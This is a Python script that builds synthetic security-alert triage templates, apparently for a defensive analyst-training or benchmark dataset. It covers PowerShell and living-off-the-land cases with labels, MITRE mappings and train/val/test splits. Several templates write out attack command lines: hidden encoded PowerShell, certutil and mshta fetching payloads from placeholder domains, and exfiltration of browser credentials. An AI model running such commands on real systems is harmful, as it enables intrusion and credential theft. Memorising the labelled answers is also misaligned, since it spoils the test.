#!/usr/bin/env python3
"""
Full AegisX Template Builder Script (v0.3)
Generates `scripts/templates_v03.py` containing all 85 distinct template families.
"""

import json
from pathlib import Path

SPEC = []

def add(tid, name, domain, task, cls, split, bl, os_fam, role, user, title, sev, rule, evts, findings, rat, mitre, actions, extra=None):
    SPEC.append({
        "id": tid, "name": name, "domain": domain, "task": task, "classification": cls,
        "split": split, "borderline": bl, "os_family": os_fam, "role": role, "user": user,
        "title": title, "severity": sev, "rule_name": rule, "evidences": evts,
        "findings": findings, "rationale": rat, "mitre": mitre, "actions": actions, "extra": extra
    })

# ===========================================================================
# 1. PowerShell & Scripting (8)
# ===========================================================================
add("TF-001", "Admin SCCM Software Deployment", "powershell_scripting", "alert_triage", "benign", "train", None,
    "Windows", "server", "svc_sccm", "PowerShell Script Execution via SCCM Agent", "low", "PowerShell Script Execution",
    [("powershell_log", "PowerShell executed signed package install script Deploy-ClientUpdate.ps1", {"script_name": "Deploy-ClientUpdate.ps1", "signer": "CN=Corp CA"}),
     ("process_creation", "CcmExec.exe spawned powershell.exe with executionpolicy bypass", {"command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\ccmcache\\Deploy-ClientUpdate.ps1"})],
    [("Authorized SCCM management agent deployed signed package update script.", ["EVT-001", "EVT-002"], "low")],
    "Execution initiated by SCCM service account running cryptographically verified internal corporate script.", [],
    [("Close alert as authorized software deployment.", "low", "Expected configuration management activity.")])

add("TF-002", "Developer Ad-Hoc Script Off-Hours", "powershell_scripting", "alert_triage", "suspicious", "train", "benign_vs_suspicious",
    "Windows", "workstation", "developer01", "Unsigned PowerShell Script Executed from User Temp", "medium", "Suspicious Script Path",
    [("powershell_log", "Unsigned script query_api_test.ps1 executed from C:\\Temp by developer01", {"script_path": "C:\\Temp\\query_api_test.ps1"}),
     ("network_connection", "powershell.exe connected to internal staging server 10.0.2.10:8080", {"dest_ip": "10.0.2.10", "dest_port": 8080})],
    [("Developer executed unsigned script from temporary directory targeting internal staging host.", ["EVT-001", "EVT-002"], "medium")],
    "Execution path outside standard dev repositories warrants verification with developer to confirm testing scope.",
    [("T1059.001", "PowerShell", "Execution", ["EVT-001"])],
    [("Contact developer01 to verify script authorization.", "medium", "Distinguish local test script from staging abuse.")],
    ["Script source code content from C:\\Temp\\query_api_test.ps1"])

add("TF-003", "Obfuscated PowerShell Download Cradle", "powershell_scripting", "alert_triage", "likely_malicious", "train", "suspicious_vs_likely_malicious",
    "Windows", "workstation", "employee01", "Base64 Encoded PowerShell Download Cradle", "high", "PowerShell Obfuscated Download",
    [("process_creation", "cmd.exe spawned powershell.exe with -w hidden -enc parameters", {"command_line": "powershell.exe -WindowStyle Hidden -Enc {enc_cmd}"}),
     ("dns_query", "DNS query for untrusted domain {domain}", {"domain": "{domain}", "resolved": "{ext_ip}"}),
     ("network_connection", "powershell.exe established TCP connection to {ext_ip}:8443", {"dest_ip": "{ext_ip}", "port": 8443})],
    [("Encoded PowerShell command executed with hidden window flag.", ["EVT-001"], "high"),
     ("Outbound connection established to suspicious external destination {domain} ({ext_ip}).", ["EVT-002", "EVT-003"], "high")],
    "Combination of obfuscation, hidden window execution, and unapproved external network cradle indicates staging activity.",
    [("T1059.001", "PowerShell", "Execution", ["EVT-001"]),
     ("T1027", "Obfuscated Files or Information", "Defense Evasion", ["EVT-001"]),
     ("T1071.001", "Web Protocols", "Command and Control", ["EVT-002", "EVT-003"])],
    [("Isolate host {hostname} from corporate network.", "immediate", "Prevent payload staging."),
     ("Block IP {ext_ip} and domain {domain} at perimeter firewall.", "high", "Terminate external communication channel.")])

add("TF-004", "Macro Document Spawning Encoded PowerShell C2", "powershell_scripting", "alert_triage", "confirmed_malicious", "train", None,
    "Windows", "workstation", "employee02", "WINWORD Spawning Obfuscated PowerShell Reverse Shell", "critical", "Office Spawning Shell",
    [("email", "Phishing email with attachment Quarterly_Bonus.docm delivered to {username}", {"subject": "Quarterly Bonus Structure", "attachment": "Quarterly_Bonus.docm"}),
     ("process_creation", "WINWORD.EXE spawned powershell.exe with encoded arguments", {"parent": "WINWORD.EXE", "command_line": "powershell.exe -nop -w hidden -enc {enc_cmd}"}),
     ("dns_query", "DNS resolution for malicious dynamic DNS host {domain}", {"domain": "{domain}", "resolved": "{ext_ip}"}),
     ("network_connection", "Persistent TCP socket established to {ext_ip}:4444", {"dest_ip": "{ext_ip}", "port": 4444})],
    [("Spearphishing attachment executed macro code spawning child PowerShell process.", ["EVT-001", "EVT-002"], "high"),
     ("Active interactive command-and-control connection established to {ext_ip}:4444 ({domain}).", ["EVT-003", "EVT-004"], "critical")],
    "Full infection chain verified from phishing lure to Office macro execution and active external reverse shell connection.",
    [("T1566.001", "Spearphishing Attachment", "Initial Access", ["EVT-001"]),
     ("T1059.001", "PowerShell", "Execution", ["EVT-002"]),
     ("T1071.001", "Web Protocols", "Command and Control", ["EVT-003", "EVT-004"])],
    [("Immediately isolate host {hostname} and terminate process tree.", "immediate", "Stop active interactive adversary access."),
     ("Purge email Quarterly_Bonus.docm from all recipient mailboxes.", "immediate", "Prevent lateral infection.")])

add("TF-005", "Truncated PowerShell Telemetry", "powershell_scripting", "alert_triage", "insufficient_evidence", "train", "suspicious_vs_insufficient_evidence",
    "Windows", "workstation", "employee05", "PowerShell Command Line Exceeding Log Buffer", "medium", "Truncated Process Telemetry",
    [("process_creation", "powershell.exe invoked with truncated command line 'powershell.exe -NoExit -Command ... [TRUNCATED]'", {"process": "powershell.exe", "truncated": True}),
     ("authentication", "Active standard user session for {username}", {"user": "{username}"})],
    [("Process creation telemetry truncated before script parameters could be inspected.", ["EVT-001", "EVT-002"], "medium")],
    "Critical arguments truncated by logging pipeline; impossible to determine benign admin script vs malicious payload without complete script block logs.", [],
    [("Collect PowerShell Event ID 4104 script block logs from host.", "high", "Retrieve complete command text.")],
    ["PowerShell Operational Event Log 4104", "Endpoint network connection records"])

add("TF-006", "Scheduled Disk Space Maintenance", "powershell_scripting", "evidence_analysis", "benign", "train", None,
    "Windows", "server", "SYSTEM", "Routine Temp Cleanup Script Executed by SYSTEM", "informational", "Maintenance Activity",
    [("scheduled_task", "Scheduled Task 'WeeklyTempCleanup' triggered on schedule", {"task_name": "WeeklyTempCleanup", "author": "SYSTEM"}),
     ("file_modification", "powershell.exe deleted 142 expired log files from C:\\Windows\\Temp", {"target_dir": "C:\\Windows\\Temp", "files_deleted": 142})],
    [("Built-in scheduled task performed routine temporary file cleanup.", ["EVT-001", "EVT-002"], "informational")],
    "Expected automated maintenance action executed by SYSTEM account according to documented schedule.", [],
    [("No action required. Routine maintenance.", "low", "Standard operational telemetry.")])

add("TF-007", "PowerShell Memory Patching AMSI Bypass", "powershell_scripting", "alert_triage", "likely_malicious", "val", "suspicious_vs_likely_malicious",
    "Windows", "workstation", "employee10", "In-Memory AMSI Bypass Pattern Detected in PowerShell", "high", "AMSI Bypass",
    [("powershell_log", "PowerShell script invoked WriteProcessMemory targeting amsi.dll!AmsiScanBuffer", {"target_dll": "amsi.dll", "api": "AmsiScanBuffer"}),
     ("process_creation", "powershell.exe executed with -NoProfile -ExecutionPolicy Bypass", {"process": "powershell.exe", "command_line": "powershell.exe -nop -ep bypass"})],
    [("PowerShell process attempted to patch AmsiScanBuffer memory region to blind EDR detection.", ["EVT-001", "EVT-002"], "high")],
    "Patching AMSI memory is a dedicated defense evasion technique characteristic of post-exploitation toolkits.",
    [("T1059.001", "PowerShell", "Execution", ["EVT-002"]),
     ("T1027", "Obfuscated Files or Information", "Defense Evasion", ["EVT-001"])],
    [("Terminate PowerShell PID on {hostname} and isolate host.", "immediate", "Prevent evasion of script scanning.")])

add("TF-008", "PowerShell Browser History Exfiltration", "powershell_scripting", "response_recommendation", "confirmed_malicious", "test", None,
    "Windows", "workstation", "contractor01", "PowerShell Staging and Exfiltrating Browser History", "critical", "Data Exfiltration",
    [("file_modification", "powershell.exe copied Chrome and Edge History and Login Data files to C:\\Users\\Public\\staging.zip", {"dest": "C:\\Users\\Public\\staging.zip"}),
     ("network_connection", "powershell.exe uploaded 4.2 MB over TLS to {ext_ip}:443", {"dest_ip": "{ext_ip}", "port": 443, "bytes_out": 4404019}),
     ("file_modification", "C:\\Users\\Public\\staging.zip securely deleted via powershell", {"deleted_file": "C:\\Users\\Public\\staging.zip"})],
    [("Adversary staged local browser credential databases into encrypted archive.", ["EVT-001"], "high"),
     ("Data exfiltrated to external host {ext_ip} followed by artifact wiping.", ["EVT-002", "EVT-003"], "critical")],
    "Explicit sequence of credential harvesting, compression, external exfiltration, and anti-forensic cleanup.",
    [("T1059.001", "PowerShell", "Execution", ["EVT-001"]),
     ("T1567.002", "Exfiltration to Cloud Storage", "Exfiltration", ["EVT-002"])],
    [("Immediately disconnect {hostname} from network and revoke all user sessions.", "immediate", "Prevent further token abuse."),
     ("Initiate enterprise-wide credential rotation for user {username}.", "immediate", "Compromised browser passwords.")])

# ===========================================================================
# 2. Living-off-the-Land (LotL) Utilities (8)
# ===========================================================================
add("TF-009", "Certutil Certificate Hash Verification", "lotl_tools", "alert_triage", "benign", "train", None,
    "Windows", "workstation", "it_admin01", "Certutil Executed for SHA256 Verification", "informational", "Certutil Hash Verification",
    [("process_creation", "certutil.exe executed with -hashfile argument on internal deployment MSI", {"command_line": "certutil.exe -hashfile C:\\Installs\\agent_v2.msi SHA256"}),
     ("authentication", "Interactive administrative session for it_admin01", {"user": "it_admin01", "logon_type": 2})],
    [("Administrator utilized certutil to verify digital hash of deployment artifact.", ["EVT-001", "EVT-002"], "informational")],
    "Standard administrative practice of computing cryptographic file integrity hashes.", [],
    [("Close alert as benign administrative hash verification.", "low", "Documented IT operations process.")])

add("TF-010", "Certutil File Download from Internal IP", "lotl_tools", "alert_triage", "suspicious", "train", "benign_vs_suspicious",
    "Windows", "workstation", "employee01", "Certutil Download from Staging Server", "medium", "Certutil Network Transfer",
    [("process_creation", "certutil.exe executed with -urlcache -split -f targeting internal host 10.0.2.25", {"command_line": "certutil.exe -urlcache -split -f http://10.0.2.25:8080/patch.exe C:\\Temp\\patch.exe"}),
     ("network_connection", "certutil.exe established HTTP connection to internal staging IP 10.0.2.25:8080", {"dest_ip": "10.0.2.25", "port": 8080})],
    [("Certutil utilized to fetch executable from internal staging address rather than official software repository.", ["EVT-001", "EVT-002"], "medium")],
    "Use of certutil for network file retrieval is an unexpected ingress method on standard workstations.",
    [("T1105", "Ingress Tool Transfer", "Command and Control", ["EVT-001", "EVT-002"])],
    [("Contact host owner to verify origin of patch.exe download.", "medium", "Ensure internal testing does not mask unauthorized tool staging.")])

add("TF-011", "Certutil Ingress Payload Download from Untrusted Domain", "lotl_tools", "alert_triage", "likely_malicious", "train", "suspicious_vs_likely_malicious",
    "Windows", "workstation", "employee05", "Certutil Ingress Transfer from Dynamic Domain", "high", "Certutil Malicious Download",
    [("process_creation", "cmd.exe spawned certutil.exe with -urlcache -split -f to external domain {domain}", {"command_line": "certutil.exe -urlcache -split -f http://{domain}/stage2.dll C:\\Users\\Public\\stage2.dll"}),
     ("dns_query", "DNS resolution for suspicious external domain {domain}", {"domain": "{domain}", "resolved": "{ext_ip}"}),
     ("file_modification", "New DLL stage2.dll created in C:\\Users\\Public", {"file_path": "C:\\Users\\Public\\stage2.dll"})],
    [("Living-off-the-land binary certutil abused to bypass web proxies and download binary from untrusted external domain.", ["EVT-001", "EVT-002", "EVT-003"], "high")],
    "Certutil ingress transfer from untrusted domain to Public folder is a high-fidelity living-off-the-land attack pattern.",
    [("T1105", "Ingress Tool Transfer", "Command and Control", ["EVT-001", "EVT-002"]),
     ("T1027", "Obfuscated Files or Information", "Defense Evasion", ["EVT-003"])],
    [("Quarantine file C:\\Users\\Public\\stage2.dll and isolate endpoint.", "immediate", "Prevent secondary stage execution.")])

add("TF-012", "Certutil Process Logged without Command Line Arguments", "lotl_tools", "alert_triage", "insufficient_evidence", "train", "likely_malicious_vs_insufficient_evidence",
    "Windows", "workstation", "intern01", "Certutil Execution Missing Process Arguments", "medium", "Process Parameter Failure",
    [("process_creation", "certutil.exe process spawned by cmd.exe with null argument string in event log", {"parent": "cmd.exe", "process": "certutil.exe", "arguments": None}),
     ("file_modification", "Temporary cache file created in Local\\Temp", {"path": "AppData\\Local\\Temp\\tmp812.tmp"})],
    [("Certutil spawned from command shell but audit log failed to record command line switches.", ["EVT-001", "EVT-002"], "medium")],
    "Cannot differentiate between certificate verification and file download without command line parameters.", [],
    [("Inspect memory dump or prefetch artifact for certutil.exe to recover arguments.", "high", "Retrieve missing switches.")],
    ["Windows Prefetch file CERTUTIL.EXE-*.pf", "EDR memory inspection logs"])

add("TF-013", "Rundll32 Shell32 Control Panel Applet", "lotl_tools", "evidence_analysis", "benign", "train", None,
    "Windows", "workstation", "employee01", "Rundll32 Invoking Standard Control Panel Applet", "informational", "Standard Control Panel Execution",
    [("process_creation", "rundll32.exe executed shell32.dll,Control_RunDLL desk.cpl for display settings", {"command_line": "rundll32.exe shell32.dll,Control_RunDLL desk.cpl"}),
     ("authentication", "User employee01 active interactive console session", {"user": "employee01", "logon_type": 2})],
    [("Standard Windows user interface launched display properties control panel.", ["EVT-001", "EVT-002"], "informational")],
    "Known benign operating system behavior triggered by user changing display properties.", [],
    [("Close alert as normal user operating system behavior.", "low", "Standard desktop activity.")])

add("TF-014", "Rundll32 Execution of Unsigned DLL from User Profile", "lotl_tools", "alert_triage", "likely_malicious", "train", None,
    "Windows", "workstation", "employee02", "Rundll32 Executing Binary from AppData", "high", "Rundll32 Unsigned Execution",
    [("file_modification", "Unsigned binary sqlite_cache.dll written to C:\\Users\\employee02\\AppData\\Local\\Temp", {"file_name": "sqlite_cache.dll", "hash": "{clean_hash}"}),
     ("process_creation", "rundll32.exe executed export DllRegisterServer in sqlite_cache.dll", {"command_line": "rundll32.exe C:\\Users\\employee02\\AppData\\Local\\Temp\\sqlite_cache.dll,DllRegisterServer"}),
     ("network_connection", "rundll32.exe initiated outbound TCP socket to {ext_ip}:443", {"dest_ip": "{ext_ip}", "port": 443})],
    [("Unsigned DLL loaded from temporary directory via rundll32 proxy execution.", ["EVT-001", "EVT-002"], "high"),
     ("Rundll32 established external network socket to untrusted IP {ext_ip}.", ["EVT-003"], "high")],
    "Proxy execution of unsigned library from user writeable directory establishing external connection matches malware loader behavior.",
    [("T1204.002", "Malicious File", "Execution", ["EVT-001", "EVT-002"]),
     ("T1071.001", "Web Protocols", "Command and Control", ["EVT-003"])],
    [("Terminate rundll32 process and quarantine sqlite_cache.dll.", "immediate", "Stop active DLL execution.")])

add("TF-015", "Mshta Executing Remote Malicious HTA", "lotl_tools", "alert_triage", "confirmed_malicious", "val", None,
    "Windows", "workstation", "accountant01", "Mshta Remote HTML Application Execution", "critical", "Mshta Ingress Execution",
    [("email", "Spearphishing email with link delivered to {username}", {"link": "http://{domain}/invoice.hta"}),
     ("process_creation", "mshta.exe executed remote URL directly from command line", {"command_line": "mshta.exe http://{domain}/invoice.hta"}),
     ("network_connection", "mshta.exe fetched payload from external host {ext_ip}:80", {"dest_ip": "{ext_ip}", "port": 80}),
     ("process_creation", "mshta.exe spawned powershell.exe with encoded payload", {"parent": "mshta.exe", "command_line": "powershell.exe -enc {enc_cmd}"})],
    [("Remote HTML application loaded directly into memory using mshta.exe.", ["EVT-001", "EVT-002", "EVT-003"], "high"),
     ("Mshta process spawned secondary obfuscated PowerShell interpreter.", ["EVT-004"], "critical")],
    "Confirmed living-off-the-land initial access chain executing script directly from untrusted external URL.",
    [("T1566.002", "Spearphishing Link", "Initial Access", ["EVT-001"]),
     ("T1204.002", "Malicious File", "Execution", ["EVT-002", "EVT-003"]),
     ("T1059.001", "PowerShell", "Execution", ["EVT-004"])],
    [("Isolate endpoint {hostname} and kill mshta/powershell process trees.", "immediate", "Prevent further stage downloads.")])

add("TF-016", "Bitsadmin Background Download Job by IT Updater", "lotl_tools", "alert_triage", "suspicious", "test", "benign_vs_suspicious",
    "Windows", "workstation", "contractor01", "Bitsadmin Job Created for File Transfer", "low", "Bitsadmin Transfer",
    [("process_creation", "bitsadmin.exe created download job 'CorporateSyncJob'", {"command_line": "bitsadmin.exe /create CorporateSyncJob"}),
     ("network_connection", "bitsadmin transferred file from internal server 10.0.1.15:443", {"dest_ip": "10.0.1.15", "port": 443})],
    [("Bitsadmin background transfer mechanism invoked to download internal asset.", ["EVT-001", "EVT-002"], "low")],
    "Bitsadmin is an archaic utility often used for stealthy persistence, though target IP is internal corporate asset.",
    [("T1105", "Ingress Tool Transfer", "Command and Control", ["EVT-001", "EVT-002"])],
    [("Verify with IT service desk if CorporateSyncJob is an authorized legacy script.", "low", "Verify transfer legitimacy.")])

print("Domains 1-2 added (16 templates).")
